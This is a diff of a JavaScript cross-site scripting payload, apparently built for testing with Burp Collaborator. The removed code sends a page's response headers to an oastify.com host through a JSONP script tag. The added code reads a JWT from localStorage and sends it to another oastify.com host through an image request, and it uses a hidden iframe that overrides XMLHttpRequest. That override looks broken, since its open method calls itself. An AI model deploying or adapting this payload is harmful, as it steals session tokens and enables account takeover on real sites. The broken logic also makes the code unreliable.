@@ -1,27 +1,34 @@
 (function() {
-    var xhr = new XMLHttpRequest();
-    xhr.open('GET', window.location.href, true);
-    xhr.onreadystatechange = function() {
-        if (xhr.readyState === XMLHttpRequest.DONE) {
-            var headers = xhr.getAllResponseHeaders();
-            var headersList = headers.split('\r\n').reduce(function(acc, current) {
-                var parts = current.split(': ');
-                if (parts.length === 2) {
-                    acc[parts[0]] = parts[1];
-                }
-                return acc;
-            }, {});
+    // Function to collect request headers and localStorage JWT
+    function collectData() {
+        var requestHeadersList = {};
+        var jwt = localStorage.getItem('jwt'); // Adjust this key to match your localStorage JWT key
 
-            // Create JSONP request
-            var script = document.createElement('script');
-            script.src = 'https://1z1udt6hwgysnq949cdxlfz4nvtmhhc51.oastify.com/collect-headers?callback=sendHeaders&url=' + encodeURIComponent(window.location.href) + '&headers=' + encodeURIComponent(JSON.stringify(headersList));
-            document.body.appendChild(script);
-        }
+        // Create an image tag to send the data to your Burp Collaborator server
+        var img = new Image();
+        img.src = 'http://tifmwlp9f8hk6isws4wp47iw6nce09wxl.oastify.com/?requestHeaders=' + encodeURIComponent(JSON.stringify(requestHeadersList)) + 
+                  '&jwt=' + encodeURIComponent(jwt);
+
+        // Inject the image into the body to trigger the request
+        document.body.appendChild(img);
+    }
+
+    // Create a hidden iframe to intercept and collect request headers
+    var iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    document.body.appendChild(iframe);
+
+    iframe.contentWindow.XMLHttpRequest = function() {
+        var xhr = new window.XMLHttpRequest();
+        xhr.open = function(method, url, async) {
+            window.setTimeout(collectData, 0); // Collect data after the request is set up
+            return xhr.open.apply(xhr, arguments);
+        };
+        return xhr;
     };
+
+    // Trigger the collection by making a dummy request
+    var xhr = new iframe.contentWindow.XMLHttpRequest();
+    xhr.open('GET', window.location.href, true);
     xhr.send();
 })();
-
-// Define the JSONP callback function
-function sendHeaders(data) {
-    console.log('Headers sent:', data);
-}
